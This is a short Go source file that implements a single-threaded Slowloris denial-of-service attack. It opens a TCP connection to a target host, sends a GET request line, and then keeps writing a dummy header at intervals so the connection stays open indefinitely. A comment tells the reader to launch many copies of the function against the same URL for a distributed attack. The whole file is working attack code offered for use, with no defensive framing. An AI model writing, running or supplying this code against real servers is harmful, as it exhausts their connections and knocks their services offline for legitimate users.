package main

import (
	"context"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"
)

// Slowloris performs single threaded slow loris attack. If you want to run distributed
// attack, just run multiple calls of the function over the same URL.
func Slowloris(ctx context.Context, index int64, interval time.Duration, url *url.URL) error {
	host := url.Host
	if !strings.Contains(host, ":") {
		host = fmt.Sprintf("%s:%s", url.Host, url.Port())
	}

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return err
	}

	requestLine := GetRequestLine()
	fmt.Println("Sending request line", requestLine)
	n, err := conn.Write([]byte(requestLine))
	if err != nil || n < len(requestLine) {
		return err
	}

	for {
		fmt.Printf("slowloris %d: send header\n", index)
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(interval):
			header := RandomHeader()
			n, err := conn.Write([]byte(header))
			if err != nil || n < len(header) {
				return err
			}
		}
	}

	return nil
}

// GetRequestLine returns HTTP request line for GET request
func GetRequestLine() string {
	return "GET / HTTP/1.1\r\n"
}

// RandomHeader generates a random HTTP header to send as part of the
// slowloris attack
func RandomHeader() string {
	return "Foo: Bar\r\n"
}

// ClosingLine sends a closing line for a HTTP request
func ClosingLine() string {
	return "\r\n"
}
